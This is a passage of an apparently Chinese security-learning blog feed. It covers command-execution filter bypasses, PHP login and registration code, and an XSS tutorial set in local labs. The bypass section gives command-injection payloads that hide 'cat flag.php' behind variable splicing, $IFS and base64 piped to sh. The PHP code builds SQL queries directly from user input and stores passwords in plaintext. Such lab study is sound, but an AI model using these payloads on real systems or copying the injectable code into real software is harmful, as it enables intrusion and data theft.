/>让变量a&#x3D;ag，让变量b&#x3D;fl，payload:<br>:::info<br>?ip&#x3D;127.0.0.1;a&#x3D;ag;b&#x3D;fl;cat$IFS$9$b$a.php<br>:::<br>变量拼接也是绕过正则过滤的一个有效的方法。<br><a name="lNjUM"></a></p><h3 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h3><p>正如我们可以将过滤掉的关键词进行base65编码来绕过正则，再使用linux命令将编码解读成我们要执行的命令。我们可以将cat flag.php进行base64编码，再用base -d命令解码。<br />payload:<br>:::info<br>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh<br>:::<br>管道符|是直接执行后面的语句。<br><a name="ta3iM"></a></p><h3 id="单双引号绕过"><a href="#单双引号绕过" class="headerlink" title="单双引号绕过"></a>单双引号绕过</h3><p>虽然这一题单双引号被ban了，但是也是一个不错的绕过姿势。使用单双引号进行拼接，比如<br />ca””t还有fl’’ag等。在linux中，读取到没有特使含义的单双引号就会被当作空格处理。<br><a name="awUBg"></a></p><h3 id="反斜线绕过"><a href="#反斜线绕过" class="headerlink" title="反斜线绕过"></a>反斜线绕过</h3><p>大同小异<br>:::info<br>ca\t fl\ag<br>:::<br><a name="Unp4L"></a></p><h3 id="1、-2等和-绕过"><a href="#1、-2等和-绕过" class="headerlink" title="$1、$2等和 $@绕过"></a>$1、$2等和 $@绕过</h3><p>大概的形式就是l$1s   ca$2t fl$@ag等等。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725105856260.png" alt="image-20230725105856260"><br />这种好像是shell编码的相关知识，目前还不太理解其原理。等以后再慢慢弄懂。<br><a name="io5yp"></a></p>]]></content>
      
      
      <categories>
          
          <category> 命令执行绕过 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库连接</title>
      <link href="/2023/06/25/shu-ju-ku-lian-jie/"/>
      <url>/2023/06/25/shu-ju-ku-lian-jie/</url>
      
        <content type="html"><![CDATA[<p><a name="zUpfz"></a></p><h2 id="连接数据库"><a href="#连接数据库" class="headerlink" title="连接数据库"></a>连接数据库</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;mytest&quot;</span>;</span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="注册页面"><a href="#注册页面" class="headerlink" title="注册页面"></a>注册页面</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>)))&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;该用户已存在，请重新注册!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">die</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users (username, password) VALUES (&#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;恭喜您,注册成功!&#x27;);window.location = &#x27;login.html&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="comment">//echo &quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;</span></span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;注册失败，请联系管理员!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a name="hkL30"></a></p><h2 id="登录页面"><a href="#登录页面" class="headerlink" title="登录页面"></a>登录页面</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; limit 0,1&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">       <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;user&#x27;</span>, <span class="variable">$username</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line">       <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">       <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_login&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">       <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">          <span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">          <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: admin.html&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: user.php&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;账号或密码错误！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="用户列表页面"><a href="#用户列表页面" class="headerlink" title="用户列表页面"></a>用户列表页面</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT username FROM users&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>; &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库连接 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss</title>
      <link href="/2023/06/15/xss/"/>
      <url>/2023/06/15/xss/</url>
      
        <content type="html"><![CDATA[<p><a name="wMTTC"></a></p><h2 id="1-XSS漏洞简介"><a href="#1-XSS漏洞简介" class="headerlink" title="1 XSS漏洞简介"></a>1 <a href="https://so.csdn.net/so/search?q=XSS%E6%BC%8F%E6%B4%9E&spm=1001.2101.3001.7020">XSS漏洞</a>简介</h2><p><strong>定义&#x2F;原理</strong>：跨站脚本（Cross-Site Scripting），本应该缩写为CSS，但是该缩写已被层叠样式脚本Cascading Style Sheets所用，所以改简称为XSS。也称跨站脚本或<a href="https://so.csdn.net/so/search?q=%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">跨站脚本攻击</a>。跨站脚本攻击XSS通过将恶意得Script代码注入到Web页面中，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。<br /><strong>本质</strong>：是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种 。<br /><strong>特点</strong>：XSS主要基于<strong>JavaScript</strong>完成恶意的攻击行为，由于JS可以非常灵活地操作html、css和浏览器，使得跨站脚本攻击的“想象”空间特别大。<br /><strong>攻击对象</strong>：被攻击者的浏览器。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript，然后浏览器不会判断代码是否恶意，也就是说xss的对象是用户的浏览器。<br /><strong>一般的攻击过程</strong>：</p><ul><li>攻击者将恶意代码注入到服务器中（如论坛、留言板、邮件等）；</li><li>用户在没有防备的情况下访问了被注入了恶意代码的服务器；</li><li>服务器将含有恶意代码的网页响应给客户端；</li><li>在客户端浏览器中触发JS恶意代码。</li></ul><p>微博、留言板、聊天室等等<strong>收集用户输入</strong>的地方，都可能被注入xss代码，都存在遭受xss的风险，只要没有对用户的输入进行严格过滤，就会被xss。当攻击者可以将恶意代码注入到服务器中，我们就认为其存在xss漏洞。<br><a name="L39ZL"></a></p><h2 id="2-XSS漏洞危害"><a href="#2-XSS漏洞危害" class="headerlink" title="2 XSS漏洞危害"></a>2 XSS漏洞危害</h2><p>恶意用户利用xss代码攻击成功后，可能会得到很高的权限，XSS漏洞主要有以下危害：<br />（1）盗取各种用户账号；<br />（2）窃取用户Cookie资料，冒充用户身份进入网站；<br />（3）劫持用户会话，执行任意操作；是指操作用户浏览器；<br />（4）刷流量，执行弹窗广告；<br />（5）传播蠕虫病毒。<br />等等<br><a name="njRq8"></a></p><h2 id="3-XSS漏洞分类"><a href="#3-XSS漏洞分类" class="headerlink" title="3 XSS漏洞分类"></a>3 XSS漏洞分类</h2><p>XSS漏洞大概可以分为三个类型：反射型XSS、存储型XSS和DOM型XSS。<br><a name="tlcP0"></a></p><h3 id="3-1-反射型XSS"><a href="#3-1-反射型XSS" class="headerlink" title="3.1 反射型XSS"></a>3.1 反射型XSS</h3><p><strong>定义</strong>：反射型XSS是非持久性、参数型跨站脚本。反射型XSS的JS代码在web应用的<strong>参数</strong>（变量）中，如搜索框的反射型XSS。<br /><strong>特点</strong>：这种攻击方式往往具有一次性。<br /><strong>攻击方式</strong>：攻击者通过电子邮件等方式将包含xss代码的<strong>恶意链接</strong>发送给目标用户。当目标用户访问该链接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后，就会触发xss漏洞。<br><a name="UP0ZK"></a></p><h3 id="3-2-存储型XSS"><a href="#3-2-存储型XSS" class="headerlink" title="3.2 存储型XSS"></a>3.2 存储型XSS</h3><p><strong>定义</strong>：存储型XSS是持久性跨站脚本，持久性体现在xss代码不是在某个参数（变量）中，而是写进<strong>数据库或文件</strong>等可以永久保存数据的介质中。存储型XSS通常发生在留言板等地方。我们在留言板位置留言，将恶意代码写进数据库中。<br /><strong>特点</strong>：攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。<br /><strong>攻击方式</strong>：这种攻击多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中 。 当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行 。所以需要浏览器从服务器载入恶意的xss代码，才能真正触发xss。<br /><strong>反射型与存储型SCC对比</strong>：<br />如果我们能够谨慎对待不明链接，那么反射型XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入在一些我们信任的页面，因此无论我们多么小心，都难免会受到攻击。<br><a name="z99XF"></a></p><h3 id="3-3-DOM型XSS"><a href="#3-3-DOM型XSS" class="headerlink" title="3.3 DOM型XSS"></a>3.3 DOM型XSS</h3><p><a name="vG3vN"></a></p><h4 id="3-3-1-节点树模型"><a href="#3-3-1-节点树模型" class="headerlink" title="3.3.1 节点树模型"></a>3.3.1 节点树模型</h4><p><strong>DOM</strong>全称Document Object Model，中文为<strong>文档对象模型</strong>，使用DOM可以使程序和脚本能够动态访问和更新文档的内容、结构及样式 。<br />HTML 的标签都是节点，而这些节点组成了 DOM 的整体结构一一节点树。通过HTML DOM，树中的所有节点均可通过JavaScript进行访问 。 所有HTML元素（节点）均可被修改，也可以创建或删除节点 。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095605939.png" alt="image-20230725095605939"><br><a name="epFYj"></a></p><h4 id="3-3-2-DOM型XSS"><a href="#3-3-2-DOM型XSS" class="headerlink" title="3.3.2 DOM型XSS"></a>3.3.2 DOM型XSS</h4><p><strong>定义</strong>：DOM型XSS比较特殊。owasp关于DOM型XSS的定义是基于DOM的XSS是一种XSS攻击，其中攻击的payload由于修改受害者浏览器页面的<strong>DOM树</strong>而执行的。其特殊的地方就是payload在浏览器本地修改DOM树而执行，并不会传到服务器上，这也就使得DOM型XSS比较难以检测。<br /><strong>网页的生成及修改</strong>：</p><ul><li>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document<br />object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件 。</li><li>可以通过JS脚本对<strong>文档对象</strong>进行编辑，从而修改页面的元素 。 也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的xss漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</li></ul><p><strong>攻击方式</strong>：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。 当用户的浏览器处理这个响应时， DOM对象就会处理XSS代码，导致存在XSS漏洞 。<br><a name="QiBv5"></a></p><h2 id="4-漏洞验证"><a href="#4-漏洞验证" class="headerlink" title="4 漏洞验证"></a>4 漏洞验证</h2><p>本博客内容仅供学习探讨，请勿滥用乱用<br><a name="Jb34m"></a></p><h3 id="4-1-漏洞验证相关概念"><a href="#4-1-漏洞验证相关概念" class="headerlink" title="4.1 漏洞验证相关概念"></a>4.1 漏洞验证相关概念</h3><p><strong>POC</strong>：全称 ’ Proof of Concept ‘，中文 ’ 概念验证 ’ ，常指一段漏洞验证的代码。<br /><strong>EXP</strong>：全称 ’ Exploit ‘，中文 ’ 利用 ‘，指利用系统漏洞进行攻击的工具，即从漏洞检测验证到利用的工具。<br /><strong>Payload</strong>：中文 ’ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。<br /><strong>Shellcode</strong>：简单翻译 ’ shell代码 ‘，利用漏洞时所执行的代码，是Payload的一种。Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。<br><a name="ZRuBw"></a></p><h3 id="4-2-漏洞验证相关概念之间的区别"><a href="#4-2-漏洞验证相关概念之间的区别" class="headerlink" title="4.2 漏洞验证相关概念之间的区别"></a>4.2 漏洞验证相关概念之间的区别</h3><p>（1）<strong>POC与EXP对比</strong><br />POC是用来验证漏洞存在的，EXP是用来完整利用漏洞(包括从验证到利用全过程)的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。<br />（2）<strong>Payload与Shellcode</strong><br />Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。<br />（3）<strong>Payload与EXP</strong><br />同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。<br />（4）<strong>Payload模块</strong><br />在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。<br><a name="hmSnz"></a></p><h3 id="4-3-常见POC"><a href="#4-3-常见POC" class="headerlink" title="4.3 常见POC"></a>4.3 常见POC</h3><p>可以用一段简单的代码（POC）来验证与检查漏洞的存在，常见的用于验证XSS漏洞存在的POC如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)&lt;<span class="regexp">/script&gt;  /</span><span class="regexp">/弹框，最常用 </span></span><br><span class="line"><span class="regexp">&lt;script&gt;confirm(&#x27;xss&#x27;)&lt;/</span>script&gt;  <span class="comment">//弹出确认框 </span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">prompt</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>   <span class="comment">//弹出输入框 </span></span><br></pre></td></tr></table></figure><p>我们发现提交的代码<script>alert(/xss/)</script> ，被当作字符串输出在HTML页面中，浏览器会根据<script>标签识别为JS代码语句，并会执行它，执行弹窗操作。也就是说，可以执行<strong>其他任意JS代码</strong>，因此我们验证了XSS漏洞的存在性。<br><a name="O6OGC"></a></p><h2 id="5-XSS漏洞验证实例"><a href="#5-XSS漏洞验证实例" class="headerlink" title="5 XSS漏洞验证实例"></a>5 XSS漏洞验证实例</h2><p><a name="eFFha"></a></p><h3 id="5-1-反射型XSS漏洞验证实例"><a href="#5-1-反射型XSS漏洞验证实例" class="headerlink" title="5.1 反射型XSS漏洞验证实例"></a>5.1 反射型XSS漏洞验证实例</h3><p>反射型XSS漏洞常存在于参数中。本实验在XSS-labs第一关做验证。具体步骤如下：<br />（1）访问win2008R2SP1虚拟机上的xss-labs靶场，页面如下。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095630662.png" alt="image-20230725095630662"><br />（2）点击图片，进入xss-labs靶场的第一关，如下所示<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095641289.png" alt="image-20230725095641289"><br />（3）我们将URL中的参数修改为?name=a回车，可以看到弹出以下页面，并将我们的内容显示在页面上。输入什么网页则返回什么，说明可能是一个XSS漏洞注入点。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095700555.png" alt="image-20230725095700555"><br />（4）我们将参数修改为?name=<script>alert(/xss/)</script>，测试是否触发弹窗。回车可以看到弹出窗口，说明网站后台未对输入参数进行过滤，存在xss漏洞。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095712043.png" alt="image-20230725095712043"><br />（5)我们右键网页，点击查看源码，如下。由于该网页没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href=&quot;level2.php?keyword=test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;object style=&quot;border:0px&quot; type=&quot;text/x-scriptlet&quot; data=&quot;http://xss.tv/themes/default/templates/head.html&quot; width=100% height=50&gt;&lt;/object&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;欢迎用户&lt;script&gt;alear(/xss/)&lt;/script&gt;&lt;/h2&gt;&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line">&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><a name="Qye7g"></a></p><h3 id="5-2-存储型XSS漏洞验证实例"><a href="#5-2-存储型XSS漏洞验证实例" class="headerlink" title="5.2 存储型XSS漏洞验证实例"></a>5.2 存储型XSS漏洞验证实例</h3><p>存储型XSS漏洞常存在于数据库内容中，如留言板等。此处利用之前搭建的论坛网站的留言功能作为实验平台，该平台的搭建过程参考《<a href="https://blog.csdn.net/m0_64378913/article/details/123934548?spm=1001.2014.3001.5502">【(SQL+HTML+PHP)综合】一个简单论坛网站的综合开发案例</a>》。具体过程如下：<br />（1）我们登录访问上述网站，使用我们之前住过的账号a，密码1。登录后返回首页，点击“我要留言”。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095725638.png" alt="image-20230725095725638"><br />（2）使用留言功能，留下如下的内容：。点击提交<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095736330.png" alt="image-20230725095736330"><br />（3）再次返回首页，可以看到刚刚留下的留言。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095747378.png" alt="image-20230725095747378"><br />（4）点击该留言，出现弹窗，这就是存储型XSS漏洞。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095759125.png" alt="image-20230725095759125"><br />（5)右键该页面，查看网页源码，如下。我们看到因为我们搭建的平台没有对输入输出内容做任何的检验与过滤，导致这种异常的内容输出到客户端浏览器，浏览器对内容做解析时，将内容按script标签进行解析，故弹窗。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset = &quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;留言论坛&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;留言内容&lt;/h1&gt;&lt;a href = &#x27;./index.php&#x27;&gt;返回首页&lt;/a&gt;&lt;hr /&gt;</span><br><span class="line">a:存储型xss&lt;hr/&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><a name="PItHm"></a></p><h3 id="5-3-DOM型XSS漏洞验证实例"><a href="#5-3-DOM型XSS漏洞验证实例" class="headerlink" title="5.3 DOM型XSS漏洞验证实例"></a>5.3 DOM型XSS漏洞验证实例</h3><p>我们将以下代码存在phpstudy网站的根目录下的DOM-XSS.php文件中，稍后进行测试。该代码中的script标签内的内容意思是，定义一个变量a并赋值为URL，为a解码，将message&#x3D;后面的内容写入到DOM树中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;DOM-XSS&lt;/title&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var a = document.URL;  //将当前页面的url赋值给变量a</span><br><span class="line">a = unescape(a);       //url有些代码是经过url编码之后的，此为将url编码进行解码</span><br><span class="line">document.write(a.substring(a.indexOf(&quot;message=&quot;)+8,a.length));</span><br><span class="line">//a.indexOf：字符串首次出现的位置，+8（&quot;message=&quot;为8字符）为取message=之后的内容</span><br><span class="line">//document.write将内容写到html页面中</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（1）我们通过浏览器访问该网页，因为我们还没有给URL传递参数message，此处将内容以存文本的形式输出。<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230725095812266.png" alt="image-20230725095812266"><br />解析为什么页面这样显示：</p><ul><li>a此处为<a href="http://172.16.1.1/DOM-XSS.php%EF%BC%9B">http://172.16.1.1/DOM-XSS.php；</a></li><li>document.write(a.substring(a.indexOf(“message&#x3D;”)+8,a.length));<br />①a为变量也即为对象，对象的访问为[对象名称.属性]；<br />②a.indexOf(“message&#x3D;”)是指message&#x3D;开始出现时的起始位置，此处没有message&#x3D;，即为0；<br />③a.indexOf(“message&#x3D;”)+8：即为8；<br 